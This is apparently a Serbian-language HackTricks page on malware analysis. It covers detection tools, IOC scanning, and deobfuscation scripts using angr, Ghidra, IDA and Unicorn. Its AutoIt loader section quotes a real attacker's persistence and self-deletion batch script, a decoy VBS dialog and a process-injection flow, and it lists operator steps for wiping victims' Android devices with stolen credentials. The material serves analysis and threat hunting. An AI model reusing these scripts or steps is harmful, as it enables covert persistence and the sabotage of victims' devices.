# Analiza malvera

{{#include ../../banners/hacktricks-training.md}}

## Forenzički CheatSheet-ovi

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Online servisi

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline antivirus i alati za detekciju

### Yara

#### Instalacija
```bash
sudo apt-get install -y yara
```
#### Pripremite pravila

Koristite ovaj skript da preuzmete i spojite sve yara malware rules sa github-a: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Kreirajte _**rules**_ direktorijum i izvršite skript. Ovo će kreirati fajl pod imenom _**malware_rules.yar**_ koji sadrži sve yara rules za malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skeniranje
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Provera malware i kreiranje yara rules

Možete koristiti alat [**YaraGen**](https://github.com/Neo23x0/yarGen) da generišete yara rules iz binarnog fajla. Pogledajte ove tutorijale: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalacija
```
sudo apt-get install -y clamav
```
#### Skeniranje
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** otkriva potencijalno zlonamerne **capabilities** u executables: PE, ELF, .NET. Dakle, pronaći će stvari kao što su Att\&ck tactics, ili sumnjive capabilities kao što su:

- check for OutputDebugString error
- run as a service
- create process

Preuzmite ga u [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC znači Indicator Of Compromise. IOC je skup **conditions that identify** nekog potencijalno neželjenog softvera ili potvrđenog **malware**. Blue Teams koriste ovu vrstu definicije da **search for this kind of malicious files** u svojim **systems** i **networks**.\
Deljenje ovih definicija je veoma korisno jer kada se malware identifikuje na računaru i kreira se IOC za taj malware, druge Blue Teams mogu koristiti taj IOC da brže identifikuju malware.

Alat za kreiranje ili izmenu IOCs je [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Možete koristiti alate kao što su [**Redline**](https://www.fireeye.com/services/freeware/redline.html) za **search for defined IOCs in a device**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) je skener za Simple Indicators of Compromise.\
Detekcija se zasniva na četiri detection methods:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) je malware skener za Linux objavljen pod GNU GPLv2 licencom, dizajniran oko pretnji sa kojima se susreću shared hosted environments. Koristi threat data iz network edge intrusion detection systems da ekstrahuje malware koji se aktivno koristi u napadima i generiše signatures za detekciju. Pored toga, threat data se takođe dobija iz user submissions pomoću LMD checkout feature i iz malware community resources.

### rkhunter

Alati kao što je [**rkhunter**](http://rkhunter.sourceforge.net) mogu se koristiti za proveru fajl sistema zbog mogućih **rootkits** i malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) je alat koji pokušava da pronađe obfuscated strings inside executables koristeći različite tehnike.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper)checks neke osnovne stvari unutar executable-a (binary data, entropy, URLs and IPs, neke yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) je alat koji omogućava dobijanje informacija o Windows executables kao što su imports, exports, headers, ali takođe će proveriti virus total i pronaći potencijalne Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) je alat za detekciju da li je fajl **encrypted** i takođe pronalazi **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is a Python script koji koristi razne **statistical methods** za detekciju **obfuscated** i **encrypted** sadržaja u text/script files. Namena NeoPI-ja je da pomogne u **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) pokušava da detektuje **obfuscated**/**dodgy code**, kao i fajlove koji koriste **PHP** funkcije često korišćene u **malwares**/webshells.

### Apple Binary Signatures

Kada proveravate neki **malware sample**, uvek bi trebalo da **check the signature** binarnog fajla, jer **developer** koji ga je potpisao možda već bude **related** sa **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Tehnike detekcije

### File Stacking

Ako znate da je neki folder koji sadrži **fajlove** web servera bio **poslednji put ažuriran** na određeni datum, **proverite** datume kada su svi **fajlovi** na **web serveru** kreirani i modifikovani; ako je neki datum **sumnjiv**, proverite taj fajl.

### Referentna stanja

Ako se fajlovi u folderu **nisu smeli izmeniti**, možete izračunati **hash** originalnih fajlova foldera i **uporediti** ih sa **trenutnim**. Sve što je izmenjeno biće **sumnjivo**.

### Statistička analiza

Kada je informacija sačuvana u logovima možete **proveriti statistiku, npr. koliko je puta je svaki fajl web servera bio pristupan**, jer web shell može biti jedan od najčešće pristupanih.

---

### Android in-app native telemetry (no root)

Na Androidu možete instrumentisati native kod unutar procesa ciljane aplikacije tako što ćete pre-pustiti malu logger biblioteku pre nego što se ostale JNI libs inicijalizuju. Ovo daje ranu vidljivost native ponašanja bez sistemskih hooks ili root-a. Popularan pristup je SoTap: ubacite libsotap.so za odgovarajući ABI u APK i injektujte poziv System.loadLibrary("sotap") rano (npr. static initializer ili Application.onCreate), zatim prikupite logove iz internog/eksternog skladišta ili fallback na Logcat.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native deobfuskacija stringova sa angr + Ghidra

Neki Android malware i RASP-protectovane aplikacije skrivaju JNI imena metoda i potpise dekodiranjem u runtime-u pre poziva RegisterNatives. Kada Frida/ptrace instrumentacija bude onemogućena od strane anti-debug mera, i dalje možete povratiti plaintext offline tako što ćete izvršiti in-binary dekoder koristeći angr i zatim ubaciti rezultate nazad u Ghidra kao komentare.

Ključna ideja: tretirajte dekoder unutar .so kao callable funkciju, izvršite ga nad obfuskovanim bajt blobovima u .rodata i konkretizujte izlazne bajtove do prvog \x00 (C-string terminator). Držite angr i Ghidra koristeći isti image base kako biste izbegli neusaglašenosti adresa.

Workflow overview
- Triage in Ghidra: identify the decoder and its calling convention/arguments in JNI_OnLoad and RegisterNatives setup.
- Run angr (CPython3) to execute the decoder for each target string and dump results.
- Annotate in Ghidra: auto-comment decoded strings at each call site for fast JNI reconstruction.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>angr podešavanje i offline izvršenje dekodera</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Na velikoj skali, izgradite statičku mapu call sites na argumente dekodera (encoded_ptr, size). Wrapperi mogu sakriti argumente, pa ovu mapu možete kreirati ručno iz Ghidra xrefs ako oporavak API-ja daje previše šuma.

<details>
<summary>Serijsko dekodiranje više call sites pomoću angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Označavanje mesta poziva u Ghidri
Opcija A: pisac komentara samo Jython-om (koristiti prethodno generisan JSON)
- Pošto angr zahteva CPython3, držite deobfuskaciju i anotaciju odvojenim. Prvo pokrenite angr skriptu iznad da biste generisali decoded_strings.json. Zatim pokrenite ovu Jython GhidraScript da upiše PRE_COMMENTs na svako mesto poziva (i uključi ime funkcije pozivaoca radi konteksta):

<details>
<summary>Ghidra Jython skripta za označavanje dekodiranih JNI stringova</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opcija B: Jedan CPython skript putem pyhidra/ghidra_bridge
- Alternativno, koristite pyhidra ili ghidra_bridge da pokrenete Ghidra’s API iz istog CPython procesa koji izvršava angr. Ovo omogućava pozivanje decode_string() i odmah postavljanje PRE_COMMENTs bez međufajla. Logika odražava Jython skriptu: izgradite callsite→function mapu preko ReferenceManager, dekodirajte pomoću angr, i postavite komentare.

Zašto ovo funkcioniše i kada ga koristiti
- Offline izvršavanje zaobilazi RASP/anti-debug: nema ptrace, nema Frida hooks potrebnih za oporavak stringova.
- Održavanje poravnanja base_addr između Ghidra i angr (npr. 0x00100000) osigurava da adrese funkcija/podataka odgovaraju u oba alata.
- Reproducibilan recept za dekodere: tretirajte transformaciju kao čistu funkciju, alocirajte izlazni buffer u novom state-u, pozovite je sa (encoded_ptr, out_ptr, len), zatim konkretizujte preko state.solver.eval i parsirajte C-strings do \x00.

Napomene i zamke
- Poštujte ciljnu ABI/calling convention. angr.factory.callable bira jednu na osnovu arch; ako argumenti deluju pomereno, navedite cc eksplicitno.
- Ako dekoder očekuje nultom inicijalizovane izlazne buffere, inicijalizujte outbuf nulama u state-u pre poziva.
- Za position-independent Android .so, uvek navedite base_addr tako da adrese u angr odgovaraju onima vidljivim u Ghidra.
- Koristite currentProgram.getReferenceManager() da izbrojite call-xrefs čak i ako aplikacija skriva dekoder iza tankih stubova.

Za osnove angr, pogledajte: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Savremene malware porodice intenzivno zloupotrebljavaju Control-Flow Graph (CFG) obfuscation: umesto direktnog jump/call oni izračunavaju odredište u runtime-u i izvršavaju `jmp rax` ili `call rax`. Mali *dispatcher* (obično devet instrukcija) postavlja finalni cilj u zavisnosti od CPU `ZF`/`CF` flagova, potpuno razbijajući statički CFG oporavak.

Tehniku – prikazanu od strane SLOW#TEMPEST loader-a – moguće je savladati trostepenim workflow-om koji se oslanja samo na IDAPython i Unicorn CPU emulator.

### 1. Pronađite svaki indirektni jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Izvucite dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emulirajte ga dva puta pomoću Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Pokreni `run(code,0,0)` i `run(code,1,1)` da dobiješ ciljeve grana *false* i *true*.

### 4. Vratite nazad direktni skok / poziv
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Nakon patchinga, prisilite IDA da ponovo analizira funkciju kako bi se kompletan CFG i Hex-Rays izlaz vratio:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Označite indirektne API pozive

Kada je poznata stvarna destinacija svakog `call rax`, možete reći IDA-i šta je to, tako da se tipovi parametara & imena promenljivih automatski obnove:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktične prednosti

* Vraća stvarni CFG → dekompilacija prelazi sa *10* linija na hiljade.
* Omogućava string-cross-reference & xrefs, čineći rekonstrukciju ponašanja trivijalnom.
* Skripte su ponovo upotrebljive: ubaci ih u bilo koji loader zaštićen istim trikom.

---

## AutoIt-based loaderi: .a3x dešifrovanje, Task Scheduler maskiranje i RAT injekcija

Ovaj obrazac upada povezuje potpisani MSI, AutoIt loadere kompajlirane u .a3x i Task Scheduler job koji se predstavlja kao bezopasan program.

### MSI → custom actions → AutoIt orkestrator

Stablo procesa i komande koje izvršavaju prilagođene akcije MSI:

- MsiExec.exe → cmd.exe da pokrene install.bat
- WScript.exe da prikaže lažni dijalog o grešci
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (drops loader, postavlja persistence, samobriše se):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (mamac za korisnika):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Ključni artefakti i prerušavanje:
- Postavlja AutoIt3.exe i IoKlTr.au3 u C:\Users\Public\Music
- Kopira schtasks.exe u hwpviewer.exe (preruši se kao Hangul Word Processor viewer)
- Kreira scheduled task "IoKlTr" koji se pokreće svake 1 minute
- Startup LNK viđen kao Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Postavlja module pod %APPDATA%\Google\Browser\ podfoldere koji sadrže `adb` ili `adv` i pokreće ih preko autoit.vbs/install.bat pomoćnih skripti

Saveti za forenzičku trijažu:
- schtasks enumeracija: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Potražite preimenovane kopije schtasks.exe koje se nalaze uz Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Uobičajene putanje: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korelirajte kreiranje procesa: AutoIt3.exe pokreće legitimne Windows binaries (npr., cleanmgr.exe, hncfinder.exe)

### AutoIt loaderi i dešifrovanje .a3x payload-a → injekcija

- AutoIt moduli su kompajlirani sa `#AutoIt3Wrapper_Outfile_type=a3x` i dešifruju ugrađene payload-e pre nego što ih injektuju u benignе procese.
- Primećene familije: QuasarRAT (injektovan u hncfinder.exe) i RftRAT/RFTServer (injektovan u cleanmgr.exe), kao i RemcosRAT moduli (`Remcos\RunBinary.a3x`).
- Šablon dešifrovanja: izvedite AES ključ putem HMAC-a, dešifrujte ugrađeni blob, zatim injektujte plaintext modul.

Generički skelet dešifrovanja (tačan HMAC ulaz/algoritam je specifičan za familiju):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) ciljnog procesa (npr. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory sa dekriptovanim modulom/shellcode-om
- CreateRemoteThread ili QueueUserAPC za izvršavanje payload

Hunting ideas
- AutoIt3.exe koji ima parent MsiExec.exe ili WScript.exe i pokreće sistemske utilitete
- Fajlovi sa `.a3x` ekstenzijom ili AutoIt skripte/skript-runneri pod javno upisivim putanjama
- Sumnjivi zakazani zadaci koji izvršavaju AutoIt3.exe ili binarne fajlove koje Microsoft nije potpisao, sa okidačima na nivou minuta

### Account-takeover abuse of Android Find My Device (Find Hub)

Tokom Windows intruzije, operateri su koristili ukradene Google kredencijale da više puta obrišu Android uređaje žrtve, utišavajući obaveštenja dok su širili pristup preko desktop messengera ulogovanog kao žrtva.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
